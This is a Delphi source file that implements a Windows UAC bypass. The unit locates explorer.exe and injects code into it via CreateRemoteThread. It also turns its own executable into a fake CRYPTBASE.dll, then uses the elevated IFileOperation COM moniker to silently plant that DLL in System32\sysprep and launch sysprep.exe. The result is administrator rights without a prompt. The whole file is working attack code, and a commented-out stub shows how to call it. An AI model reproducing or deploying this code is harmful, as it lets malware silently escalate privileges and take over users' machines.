unit Unit2;
{.$DEFINE STATICLOAD_ICONV}
//These should be defined in libc.pas.

interface

uses
Windows,
SysUtils,
ActiveX,
ShlObj,
ShellAPI,
Psapi;

type
PBindOpts3 = ^TBindOpts3;
{$EXTERNALSYM tagBIND_OPTS3}
tagBIND_OPTS3 = record
cbStruct: DWORD;
grfFlags: DWORD;
grfMode: DWORD;
dwTickCountDeadline: DWORD;
dwTrackFlags: DWORD;
dwClassContext: DWORD;
locale: LCID;
pServerInfo: Pointer;
hwnd: hwnd;
end;
TBindOpts3 = tagBIND_OPTS3;
{$EXTERNALSYM BIND_OPTS3}
BIND_OPTS3 = TBindOpts3;

type
PInjectArgs = ^InjectArgs;
InjectArgs = record
// Functions
FFreeLibrary : function(hLibModule: HMODULE): BOOL; stdcall;
FLoadLibrary : function(lpLibFileName: LPCWSTR): HMODULE; stdcall;
FGetProcAddress : function(hModule: HMODULE; lpProcName: LPCSTR): FARPROC; stdcall;
FCloseHandle : function(hObject: THandle): BOOL; stdcall;
FWaitForSingleObject : function(hHandle: THandle; dwMilliseconds: DWORD): DWORD; stdcall;
// Static strings
szSourceDll : array [0..MAX_PATH-1] of widechar;
szElevDir : array [0..MAX_PATH-1] of widechar;
szElevDll : array [0..MAX_PATH-1] of widechar;
szElevDllFull : array [0..MAX_PATH-1] of widechar;
szElevExeFull : array [0..MAX_PATH-1] of widechar;
szElevArgs : array [0..MAX_PATH-1] of widechar;
szEIFOMoniker : array [0..MAX_PATH-1] of widechar;
// some GUIDs
pIID_EIFO : TGUID;
pIID_ShellItem2 : TGUID;
pIID_Unknown : TGUID;
// Dll and import strings
NameShell32 : array [0..20-1] of widechar;
NameOle32 : array [0..20-1] of widechar;
NameCoInitialize : array [0..20-1] of ansichar;
NameCoUninitialize : array [0..20-1] of ansichar;
NameCoGetObject : array [0..20-1] of ansichar;
NameCoCreateInstance : array [0..20-1] of ansichar;
NameSHCreateItemFromParsingName : array [0..30-1] of ansichar;
NameShellExecuteExW : array [0..20-1] of ansichar;
// IMPORTANT: Allocating structures here (so we know where it was allocated)
shinfo : SHELLEXECUTEINFO;
bo : TBindOpts3;
end;
  function UACBypass : Integer;
// important: error code here is passed back to original process (1 = success, 0 = failure)
 implementation
function RemoteCodeFunc ( Args : PInjectArgs ) : DWORD; stdcall;
var
Status : BOOL;
ModuleOle32 : HMODULE;
ModuleShell32 : HMODULE;
FCoInitialize : function(pvReserved: Pointer): HResult; stdcall;
FCoUninitialize : procedure; stdcall;
FCoGetObject : function(pszName: PWideChar; pBindOptions: PBindOpts; const iid: TIID; ppv: Pointer): HResult; stdcall;
FCoCreateInstance : function(const clsid: TCLSID; unkOuter: IUnknown; dwClsContext: Longint; const iid: TIID; out pv): HResult; stdcall;
FSHCreateItemFromParsingName : function(pszPath: LPCWSTR; const pbc: IBindCtx; const riid: TIID; out ppv): HResult; stdcall;
FShellExecuteEx : function(lpExecInfo: PShellExecuteInfo):BOOL; stdcall;
pFileOp : IFileOperation;
pSHISource : IShellItem;
pSHIDestination : IShellItem;
pSHIDelete : IShellItem;
// Debug
FMessageBoxW : function(hWnd: HWND; lpText, lpCaption: LPCWSTR; uType: UINT): Integer; stdcall;
ModuleUser32 : HMODULE;
NameUser32 : array [0..06] of WideChar;
NameMessageBoxW : array [0..11] of AnsiChar;
begin
// Debug
NameUser32[0] := 'u';
NameUser32[1] := 's';
NameUser32[2] := 'e';
NameUser32[3] := 'r';
NameUser32[4] := '3';
NameUser32[5] := '2';
NameUser32[6] := #0;
NameMessageBoxW[0] := 'M';
NameMessageBoxW[1] := 'e';
NameMessageBoxW[2] := 's';
NameMessageBoxW[3] := 's';
NameMessageBoxW[4] := 'a';
NameMessageBoxW[5] := 'g';
NameMessageBoxW[6] := 'e';
NameMessageBoxW[7] := 'b';
NameMessageBoxW[8] := 'o';
NameMessageBoxW[9] := 'x';
NameMessageBoxW[10] := 'W';
NameMessageBoxW[11] := #0;
ModuleUser32 := Args^.FLoadLibrary (NameUser32);
@FMessageBoxW := Args^.FGetProcAddress (ModuleUser32, NameMessageBoxW);
FMessageBoxW (0, NIL, NIL, 0);
result := 0;
// don't rely on any static data here as this function is copied alone into remote process! (we assume at least that kernel32 is at same address)
Status := FALSE;
// Use an elevated FileOperation object to copy a file to a protected folder.
// If we're in a process that can do silent COM elevation then we can do this without any prompts.
ModuleOle32 := Args^.FLoadLibrary (Args^.NameOle32);
ModuleShell32 := Args^.FLoadLibrary (Args^.NameShell32);
if (ModuleOle32 = 0) or (ModuleShell32 = 0) then Exit(0);
// Load the non-Kernel32.dll functions that we need.
@FCoInitialize := Args^.FGetProcAddress (ModuleOle32, Args^.NameCoInitialize);
@FCoUninitialize := Args^.FGetProcAddress (ModuleOle32, Args^.NameCoUninitialize);
@FCoGetObject := Args^.FGetProcAddress (ModuleOle32, Args^.NameCoGetObject);
@FCoCreateInstance := Args^.FGetProcAddress (ModuleOle32, Args^.NameCoCreateInstance);
@FSHCreateItemFromParsingName := Args^.FGetProcAddress (ModuleShell32, Args^.NameSHCreateItemFromParsingName);
@FShellExecuteEx := Args^.FGetProcAddress (ModuleShell32, Args^.NameShellExecuteExW);
if (@FCoInitialize = NIL) or
(@FCoUninitialize = NIL) or
(@FCoGetObject = NIL) or
(@FCoCreateInstance = NIL) or
(@FSHCreateItemFromParsingName = NIL) or
(@FShellExecuteEx = NIL) or
(FCoInitialize (NIL) <> S_OK) then exit(0);
Args^.bo.cbStruct := SizeOf(BIND_OPTS3);
Args^.bo.dwClassContext := CLSCTX_LOCAL_SERVER;
// For testing other COM objects/methods, start here.
pFileOp := NIL;
pSHISource := NIL;
pSHIDestination := NIL;
pSHIDelete := NIL;
// This is a completely standard call to IFileOperation, if you ignore all the pArgs/func-pointer indirection.
if (FCoGetObject (Args^.szEIFOMoniker, @Args^.bo, Args^.pIID_EIFO, @pFileOP) = S_OK) and
(pFileOp <> NIL) and
(pFileOp.SetOperationFlags (FOF_NOCONFIRMATION or FOF_SILENT or FOFX_SHOWELEVATIONPROMPT or FOFX_NOCOPYHOOKS or FOFX_REQUIREELEVATION or FOF_NOERRORUI) = S_OK) and // FOF_NOERRORUI is important here to not show error messages, copying fails on guest (takes wrong path)
(FSHCreateItemFromParsingName(Args^.szSourceDll, NIL, Args^.pIID_ShellItem2, pSHISource) = S_OK) and // ---> Crashes here in remote process
(pSHISource <> NIL) and
(FSHCreateItemFromParsingName(Args^.szElevDir, NIL, Args^.pIID_ShellItem2, pSHIDestination) = S_OK) and
(pSHIDestination <> NIL) and
(pFileOp.CopyItem(pSHISource, pSHIDestination, Args^.szElevDll, NIL) = S_OK) and
(pFileOp.PerformOperations = S_OK)
then begin
// Use ShellExecuteEx to launch the "part 2" target process. Again, a completely standard API call.
// (Note: Don't use CreateProcess as it seems not to do the auto-elevation stuff.)
Args^.shinfo.cbSize := sizeof(SHELLEXECUTEINFO);
Args^.shinfo.fMask := SEE_MASK_NOCLOSEPROCESS;
Args^.shinfo.lpFile := Args^.szElevExeFull;
Args^.shinfo.lpParameters := Args^.szElevArgs;
Args^.shinfo.lpDirectory := Args^.szElevDir;
Args^.shinfo.nShow := SW_SHOW;
// update: we assume the cryptbase.dll deletes itself (no waiting for syspreps execution although it would be possible)
Status := FShellExecuteEx(@Args^.shinfo);
if Status then Args^.FCloseHandle (Args^.shinfo.hProcess);
end;
// clean-up
pSHIDelete := NIL;
pSHIDestination := NIL;
pSHISource := NIL;
pFileOp := NIL;
FCoUninitialize;
Args^.FFreeLibrary (ModuleShell32);
Args^.FFreeLibrary (ModuleOle32);
if Status then result := 1 else result := 0;
end;

// returns 1 when you can expect everything worked fine!

function AttemptOperation(bInject : Bool; TargetProcess: THandle; szPathToOurDll : WideString) : Integer;
var
Status : DWORD;
codeStartAdr : Pointer;
codeEndAdr : Pointer;
ia : InjectArgs;
SystemDirectory : array [0..MAX_PATH-1] of widechar;
TempString : WideString;
tmpFo : IFileOperation;
tmpSI : IShellItem2;
tmpun : IUnknown;
RemoteArgs : Pointer;
WrittenBytes : SIZE_T;
RemoteCode : Pointer;
hRemoteThread : THandle;
ThreadID : DWORD;
dwWaitRes : DWORD;
begin
Status := 0;
result := 0;
codeStartAdr := @RemoteCodeFunc;
codeEndAdr := @AttemptOperation;
if (NativeUInt(codeStartAdr) >= NativeUInt(codeEndAdr)) then exit(0); // ensure we don't copy crap
// Here we define the target process and DLL for "part 2." This is an auto/silent-elevating process which isn't
// directly below System32 and which loads a DLL which is directly below System32 but isn't on the OS's "Known DLLs" list.
// If we copy our own DLL with the same name to the exe's folder then the exe will load our DLL instead of the real one.
// set up arguments
ZeroMemory(@ia, SizeOf(ia));
@ia.FFreeLibrary := GetProcAddress(GetModuleHandle('kernel32'), 'FreeLibrary');
@ia.FLoadLibrary := GetProcAddress(GetModuleHandle('kernel32'), 'LoadLibraryW');
@ia.FGetProcAddress := GetProcAddress(GetModuleHandle('kernel32'), 'GetProcAddress');
@ia.FCloseHandle := GetProcAddress(GetModuleHandle('kernel32'), 'CloseHandle');
@ia.FWaitForSingleObject := GetProcAddress(GetModuleHandle('kernel32'), 'WaitForSingleObject');
ia.NameShell32 := 'shell32.dll';
ia.NameOle32 := 'ole32.dll';
ia.NameCoInitialize := 'CoInitialize';
ia.NameCoUninitialize := 'CoUninitialize';
ia.NameCoGetObject := 'CoGetObject';
ia.NameCoCreateInstance := 'CoCreateInstance';
ia.NameSHCreateItemFromParsingName := 'SHCreateItemFromParsingName';
ia.NameShellExecuteExW := 'ShellExecuteExW';
if GetSystemDirectory(SystemDirectory, MAX_PATH) = 0 then exit(0);
CopyMemory (@ia.szSourceDll[0], @szPathToOurDLL[1], Length (szPathToOurDll) * 2);
TempString := SystemDirectory + '\sysprep';
CopyMemory (@ia.szElevDir[0], @TempString[1], Length(TempString) * 2);
ia.szElevDll := 'CRYPTBASE.dll';
TempString := TempString + '\sysprep.exe';
CopyMemory (@ia.szElevExeFull[0], @TempString[1], Length(TempString) * 2);
ia.szEIFOMoniker := 'Elevation:Administrator!new:{3ad05575-8857-4850-9277-11b85bdb8e09}';
ia.pIID_EIFO := iFileOperation;
ia.pIID_ShellItem2 := iShellItem2;
ia.pIID_Unknown := IUnknown;
{$IFDEF Debug}
bInject := FALSE;
{$EndIf}
if bInject then begin
RemoteArgs := VirtualAllocEx(TargetProcess, 0, sizeof(ia), MEM_COMMIT, PAGE_READWRITE);
if (RemoteArgs = NIL) or (not(WriteProcessMemory(TargetProcess, RemoteArgs, @ia, sizeof(ia), WrittenBytes))) then exit(0);
RemoteCode := VirtualAllocEx(TargetProcess, 0, NativeUInt(codeEndAdr) - NativeUInt(codeStartAdr), MEM_COMMIT, PAGE_EXECUTE_READ);
if (RemoteCode = NIL) or (not(WriteProcessMemory(TargetProcess, RemoteCode, @RemoteCodeFunc, NativeUInt(codeEndAdr) - NativeUInt(codeStartAdr), WrittenBytes))) then exit(0);
hRemoteThread := CreateRemoteThread(TargetProcess, NIL, 0, RemoteCode, RemoteArgs, 0, ThreadID);
if hRemoteThread = 0 then exit(0);
dwWaitRes := WaitForSingleObject(hRemoteThread, INFINITE);
if dwWaitRes = WAIT_OBJECT_0 then begin
GetExitCodeThread(hRemoteThread, Status);
end;
CloseHandle (hRemoteThread);
end else begin
Status := RemoteCodeFunc(@ia);
end;
result := Status;
end;

function UACBypass : Integer;
const
INVALID_SET_FILE_POINTER = DWORD(-1);
var
ProcessName : array [0..MAX_PATH-1] of widechar;
Processes : array [0..1024 - 1] of DWORD;
BytesReturned : DWORD;
I : Integer;
TargetProcess : THandle;
cbNeeded : DWORD;
hMod : HMODULE;
SelfFileName : array [0..MAX_PATH-1] of widechar;
FakeCrytbase : array [0..MAX_PATH-1] of widechar;
FakeFile : THandle;
NumberOfBytesRead : DWORD;
ImageHeader : array [0..4096 - 1] of byte;
dos_header : PImageDosHeader;
old_header : PImageNtHeaders;
NumberOfBytesWritten : DWORD;
Status : Integer;
begin
result := 0;
TargetProcess := 0;
ZeroMemory (@Processes, SizeOf(Processes));
if EnumProcesses (@Processes, SizeOf(Processes), BytesReturned) then begin
for i := 0 to (BytesReturned div SizeOf(DWORD)) - 1 do begin
TargetProcess := OpenProcess(PROCESS_ALL_ACCESS, false, Processes[i]);
if TargetProcess <> 0 then begin
if EnumProcessModules(TargetProcess, @hMod, sizeof(hMod), cbNeeded) then begin
GetModuleBaseName (TargetProcess, hmod, ProcessName, sizeof(ProcessName) div sizeof(CHAR));
if StrUpper(ProcessName) = 'EXPLORER.EXE' then begin
break;
end;
end;
CloseHandle(TargetProcess);
TargetProcess := 0;
end;
end;
end;
if TargetProcess = 0 then exit;
if GetModuleFileNameW(0, SelfFileName, MAX_PATH) = 0 then begin
CloseHandle(TargetProcess);
exit;
end;
GetTempPathW(MAX_PATH, FakeCrytbase);
GetTempFileNameW(FakeCrytbase, 'tmp', 0, FakeCrytbase);
if not( CopyFile(SelfFileName, FakeCrytbase, FALSE) ) then begin
CloseHandle(TargetProcess);
exit;
end;
FakeFile := CreateFileW(FakeCrytbase, GENERIC_READ or GENERIC_WRITE, 0, NIL, OPEN_EXISTING, 0, 0);
if FakeFile = INVALID_HANDLE_VALUE then begin
CloseHandle(TargetProcess);
exit;
end;
if not( ReadFile(FakeFile, ImageHeader, 4096, NumberOfBytesRead, NIL) ) then begin
CloseHandle(TargetProcess);
CloseHandle(FakeFile);
exit;
end;
dos_header := PImageDosHeader (@ImageHeader);
old_header := PImageNtHeaders (@ImageHeader[dos_header._lfanew]);
old_header.FileHeader.Characteristics := old_header.FileHeader.Characteristics or IMAGE_FILE_DLL;
if (SetFilePointer(FakeFile, 0, NIL, FILE_BEGIN) = INVALID_SET_FILE_POINTER) or
not(WriteFile(FakeFile, ImageHeader, 4096, NumberOfBytesWritten, NIL)) then begin
CloseHandle(TargetProcess);
CloseHandle(FakeFile);
exit;
end;
CloseHandle(FakeFile);
Status := AttemptOperation(TRUE, TargetProcess, FakeCrytbase);
CloseHandle(TargetProcess);
DeleteFile(FakeCrytbase);
// exit if we can assume that the elevation worked correctly, and this executable was started with auto-elevated rights
if (Status = 1) then ExitProcess(1);
end;

function CheckTokenMembership(TokenHandle: THandle; SidToCheck: PSID; var IsMember: BOOL): BOOL; stdcall; external advapi32;

function IsUserElevatedAdmin : Bool;
const
SECURITY_NT_AUTHORITY : TSIDIdentifierAuthority = (Value: (0, 0, 0, 0, 0, 5));
SECURITY_BUILTIN_DOMAIN_RID = $00000020;
DOMAIN_ALIAS_RID_ADMINS = $00000220;
var
SecurityIdentifier : PSID;
begin
if not(AllocateAndInitializeSid (SECURITY_NT_AUTHORITY, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, SecurityIdentifier)) then exit(false);
if (not(CheckTokenMembership(0, SecurityIdentifier, result))) then result := FALSE;
FreeSid(SecurityIdentifier);
end;

{var
VersionInfo : OSVERSIONINFO;

begin
VersionInfo.dwOSVersionInfoSize := sizeof(OSVERSIONINFO);
GetVersionEx(VersionInfo);
// Windows 7, 8: Try injecting into auto-elevated process if admin and UAC is on default (prompts 2 times on guest with credential UI so you should add a check for guest)
if ( (VersionInfo.dwMajorVersion = 6) and ( (VersionInfo.dwMinorVersion = 1) or (VersionInfo.dwMinorVersion = 2) ) and (not(IsUserElevatedAdmin)) ) then begin
// ... your code here ...
if UACBypass = 1 then begin
MessageBox (0, 'Elevated.', '', 0);
end else begin
MessageBox (0, 'Not elevated.', '', 0);
end;
end; }

end.
